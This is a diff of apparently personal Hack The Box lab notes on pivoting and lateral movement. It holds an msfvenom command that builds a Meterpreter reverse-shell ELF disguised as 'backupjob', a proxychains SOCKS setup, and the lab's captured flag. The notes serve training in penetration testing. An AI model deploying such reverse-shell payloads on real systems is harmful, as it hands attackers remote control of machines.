@@ -93,11 +93,14 @@ IP of second host found
 ```
 172.16.5.35
 ```
-![[host_discovery2.png]]
+![[pivot_host_ips.png]]
+
+This box is the pivot host.
+![[Pasted image 20250403220026.png]]
 
 Generate msfvenom payload
 ```go
-bundle exec msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.15.37 -f elf -o backupjob LPORT=8080
+bundle exec msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.15.129 -f elf -o backupjob LPORT=8080
 ```
 
 Copy backupjob to webadmin server
@@ -138,6 +141,8 @@ Facts:
 - I need to establish a proxy on the attack host so that I can reach the 172.16.5.35 machine
 
 ### Configure MSF's SOCKS Proxy
+
+>[! tip ] Remember, SOCKS Proxy acts as a local proxy and will establish a route based on the destination 
 
 >[! Warning] Before proceeding, ensure the line `socks4  127.0.0.1 9050` is present in `/etc/proxychains.conf`
 
@@ -240,4 +245,5 @@ Flag Acquired
 S1ngl3-Piv07-3@sy-Day
 ```
 ![[HTB Field Manual/5-Lateral Movement/Skill Assessment/screenshots/flag.png]]
+
 
